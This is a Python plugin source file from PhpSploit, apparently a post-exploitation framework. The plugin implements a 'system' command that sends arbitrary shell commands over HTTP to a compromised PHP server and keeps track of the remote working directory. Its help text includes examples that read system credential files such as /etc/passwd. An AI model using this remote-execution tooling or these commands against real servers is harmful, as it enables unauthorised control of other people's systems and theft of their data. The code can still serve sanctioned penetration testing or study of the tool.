"""Execute a command on the server

SYNOPSIS:
    system "<SHELL COMMAND>"

DESCRIPTION:
    Even if the PhpSploit plugins generally are mad to simulate
    the standard usefull shell commands, in order to bypass the
    frequent PHP installations which disables real shell
    execution, for the times it is not blocked, this command
    must be used to send real commands.

    NOTE: This plugins works on any standard platform, but the
    following features are only available on unix systems:

    - To any sent command, a "cd" command to move to the
    PhpSploit's CWD environment variable will be prepended. It
    ensures the commands are launched from the PhpSploit's
    current working directory.
    - To any sent command, a 'pwd' command is appendend as last
    command to collect the current working directory before
    commands execution, in cases the requested commands ordered
    to change the directory. Then the CWD environment variable
    is updated according new pwd.

WARNING:
    Considering the PhpSploit's input parser, commands which
    contain quotes, semicolons, and other chars that could be
    interpreted by the framework MUST be enquoted to be
    interpreted as a single argument. For example:
      > run echo 'foo bar' > /tmp/foobar; cat /etc/passwd
    In this case, quotes and semicolons will be interpreted by
    the framwework, so the correct syntax is:
      > run "echo 'foo bar' > /tmp/foobar; cat /etc/passwd"

EXAMPLES:
    > system ipconfig /all
      - Run the 'ipconfig' tool on windows servers
    > system ls -la /etc
      - List any file in the /etc/ directory on *nix systems
    > system "cat /etc/passwd | grep root; ls /tmp"
      - Just a multi command, which must be enquoted because
        of the semicolon (see WARNING)

AUTHOR:
    nil0x42 <http://goo.gl/kb2wf>
"""

api.isshell()

if self.argc < 2:
    api.exit(self.help)

cmdSep = ";"
if api.server['platform'] == 'win':
    cmdSep = "&"

cmdSep = " %s " % cmdSep

commands = list()

# patch to view stderr in linux
if api.server['platform'] == 'nix':
    commands+= ['exec 2>&1']

# go to pwd
commands+= ['cd '+rpath.cwd]

# here i use self.args that is all the raw line arguments string
# because ' '.join(self.argv) is an altered string that was parsed by phpsploit
commands+= [self.args]


CMD = cmdSep.join(commands)

# patch to take care of new CWD if changed (part1)
if api.server['platform'] == 'nix':
    CMD+= cmdSep+'pwd'

http.send({'CMD' : CMD})

response = http.response.splitlines()


# patch to take care of new CWD if changed (part2)
if api.server['platform'] == 'nix':
    if len(response):
        if response[-1].startswith('/'):
            api.env['CWD'] = response[-1].strip()
            response = response[:-1]
    else:
        response = []

if response:
    print P_NL.join(response)
